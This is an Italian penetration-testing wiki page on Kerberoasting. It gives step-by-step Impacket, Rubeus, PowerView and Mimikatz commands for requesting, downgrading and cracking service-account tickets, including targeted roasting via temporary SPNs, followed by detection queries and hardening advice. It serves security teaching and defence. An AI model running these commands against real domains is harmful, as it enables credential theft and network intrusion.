# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting si concentra sull'acquisizione di TGS tickets, nello specifico quelli legati a servizi che girano sotto account utente in Active Directory (AD), escludendo gli account computer. La cifratura di questi ticket utilizza chiavi derivate dalle password degli utenti, permettendo il cracking offline delle credenziali. L'uso di un account utente come servizio è indicato da una proprietà ServicePrincipalName (SPN) non vuota.

Qualsiasi utente di dominio autenticato può richiedere TGS tickets, quindi non sono necessari privilegi speciali.

### Punti chiave

- Mira ai TGS tickets per servizi che girano sotto account utente (ossia, account con SPN impostato; non account computer).
- I ticket sono cifrati con una chiave derivata dalla password dell'account di servizio e possono essere crackati offline.
- Non sono necessari privilegi elevati; qualsiasi account autenticato può richiedere TGS tickets.

> [!WARNING]
> La maggior parte degli strumenti pubblici preferisce richiedere service tickets RC4-HMAC (etype 23) perché sono più veloci da crackare rispetto ad AES. Gli hash RC4 TGS iniziano con `$krb5tgs$23$*`, AES128 con `$krb5tgs$17$*`, e AES256 con `$krb5tgs$18$*`. Tuttavia, molti ambienti stanno migrando a solo AES. Non dare per scontato che solo RC4 sia rilevante.
> Inoltre, evita il kerberoast “spray-and-pray”. Il kerberoast di default di Rubeus può enumerare e richiedere ticket per tutti gli SPN ed è rumoroso. Enumera e prendi di mira prima i principal interessanti.

### Segreti degli account di servizio & costo crittografico di Kerberos

Molti servizi ancora girano sotto account utente con password gestite manualmente. Il KDC cifra i service tickets con chiavi derivate da quelle password e restituisce il ciphertext a qualsiasi principal autenticato, quindi il kerberoasting offre tentativi offline illimitati senza lockout o telemetria del DC. La modalità di cifratura determina il budget di cracking:

| Modalità | Derivazione chiave | Tipo di cifratura | Throughput approssimativo RTX 5090* | Note |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 con 4.096 iterazioni e un salt per-principal generato dal dominio + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 million guesses/s | Il salt blocca le rainbow table ma permette ancora cracking veloce di password brevi. |
| RC4 + NT hash | Singolo MD4 della password (NT hash non salato); Kerberos mescola solo un confounder di 8 byte per ticket | etype 23 (`$krb5tgs$23$`) | ~4.18 **billion** guesses/s | ~1000× più veloce di AES; gli attaccanti forzano RC4 ogni volta che `msDS-SupportedEncryptionTypes` lo permette. |

*Benchmarks da Chick3nman come riportato in [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).

Il confounder di RC4 randomizza solo lo keystream; non aggiunge lavoro per tentativo. A meno che gli account di servizio non si affidino a segreti random (gMSA/dMSA, machine accounts, o stringhe gestite da vault), la velocità di compromesso è puramente determinata dal budget GPU. Forzare etypes solo AES rimuove il downgrade che permette miliardi di tentativi al secondo, ma password umane deboli cadono ancora sotto PBKDF2.

### Attacco

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Strumenti multi-funzione che includono controlli kerberoast:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Enumerare gli utenti kerberoastable
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Tecnica 1: Richiedi TGS e dump dalla memoria
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Tecnica 2: Strumenti automatici
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Una richiesta TGS genera l'evento di sicurezza Windows 4769 (È stato richiesto un Kerberos service ticket).

### OPSEC e ambienti AES-only

- Richiedere RC4 intenzionalmente per account senza AES:
- Rubeus: `/rc4opsec` usa tgtdeleg per enumerare account senza AES e richiede RC4 service ticket.
- Rubeus: `/tgtdeleg` con kerberoast attiva anche richieste RC4 dove possibile.
- Roast account AES-only invece di fallire silenziosamente:
- Rubeus: `/aes` enumera account con AES abilitato e richiede ticket di servizio AES (etype 17/18).
- Se possiedi già un TGT (PTT o da un .kirbi), puoi usare `/ticket:<blob|path>` con `/spn:<SPN>` o `/spns:<file>` e saltare LDAP.
- Targeting, throttling e meno rumore:
- Usa `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` e `/jitter:<1-100>`.
- Filtra per password probabilmente deboli usando `/pwdsetbefore:<MM-dd-yyyy>` (password più vecchie) o mira a OU privilegiate con `/ou:<DN>`.

Esempi (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistenza / Abuso

Se controlli o puoi modificare un account, puoi renderlo kerberoastable aggiungendo un SPN:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Eseguire il downgrade di un account per abilitare RC4 e facilitare il cracking (richiede privilegi di scrittura sull'oggetto di destinazione):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### Targeted Kerberoast via GenericWrite/GenericAll su un utente (temporary SPN)

Quando BloodHound mostra che hai il controllo su un oggetto utente (ad es. GenericWrite/GenericAll), puoi eseguire in modo affidabile un “targeted-roast” su quell'utente specifico anche se attualmente non ha SPN:

- Aggiungi uno SPN temporaneo all'utente controllato per renderlo roastable.
- Richiedi un TGS-REP criptato con RC4 (etype 23) per quello SPN per favorire il cracking.
- Effettua il cracking dell'hash `$krb5tgs$23$...` con hashcat.
- Rimuovi lo SPN per ridurre le tracce.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux one-liner (targetedKerberoast.py automatizza l'aggiunta di SPN -> la richiesta di TGS (etype 23) -> la rimozione di SPN):
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
Esegui il crack dell'output con hashcat autodetect (mode 13100 per `$krb5tgs$23$`):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Detection notes: adding/removing SPNs produces directory changes (Event ID 5136/4738 on the target user) and the TGS request generates Event ID 4769. Consider throttling and prompt cleanup.

You can find useful tools for kerberoast attacks here: https://github.com/nidem/kerberoast

If you find this error from Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` it’s due to local time skew. Sync to the DC:

- `ntpdate <DC_IP>` (deprecated on some distros)
- `rdate -n <DC_IP>`

### Kerberoast without a domain account (AS-requested STs)

Nel settembre 2022, Charlie Clark ha mostrato che se un principal non richiede pre-authentication, è possibile ottenere un service ticket tramite un KRB_AS_REQ creato modificando lo sname nel corpo della richiesta, ottenendo effettivamente un service ticket invece di un TGT. Questo rispecchia AS-REP roasting e non richiede credenziali di dominio valide.

See details: Semperis write-up “New Attack Paths: AS-requested STs”.

> [!WARNING]
> Devi fornire una lista di utenti perché senza credenziali valide non puoi interrogare LDAP con questa tecnica.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Correlati

Se stai prendendo di mira utenti AS-REP roastable, vedi anche:

{{#ref}}
asreproast.md
{{#endref}}

### Rilevamento

Kerberoasting può essere silenzioso. Cerca Event ID 4769 dai DC e applica filtri per ridurre il rumore:

- Escludi il nome del servizio `krbtgt` e i nomi di servizio che terminano con `$` (account dei computer).
- Escludi le richieste dagli account macchina (`*$$@*`).
- Solo richieste riuscite (Failure Code `0x0`).
- Monitora i tipi di crittografia: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Non generare allarmi solo per `0x17`.

Esempio di triage PowerShell:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Additional ideas:

- Stabilire una baseline dell'uso normale degli SPN per host/utente; generare un'allerta su grandi raffiche di richieste di SPN distinti provenienti da un singolo principal.
- Segnalare un uso insolito di RC4 nei domini AES-hardened.

### Mitigazione / Hardening

- Usare gMSA/dMSA o machine accounts per i servizi. I managed accounts hanno password casuali di oltre 120 caratteri e ruotano automaticamente, rendendo il cracking offline impraticabile.
- Forzare AES sugli service account impostando `msDS-SupportedEncryptionTypes` su AES-only (decimal 24 / hex 0x18) e poi ruotare la password in modo che vengano derivate chiavi AES.
- Dove possibile, disabilitare RC4 nell'ambiente e monitorare i tentativi di utilizzo di RC4. Sui DCs è possibile usare il valore di registro `DefaultDomainSupportedEncTypes` per indirizzare i default per gli account senza `msDS-SupportedEncryptionTypes` impostato. Testare a fondo.
- Rimuovere SPN non necessari dagli account utente.
- Usare password lunghe e casuali per i service account (25+ caratteri) se i managed accounts non sono praticabili; vietare password comuni e fare audit regolari.

## References

- [https://github.com/ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [Matthew Green – Kerberoasting: Low-Tech, High-Impact Attacks from Legacy Kerberos Crypto (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [SpecterOps – Rubeus Roasting documentation](https://docs.specterops.io/ghostpack/rubeus/roasting)
- [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
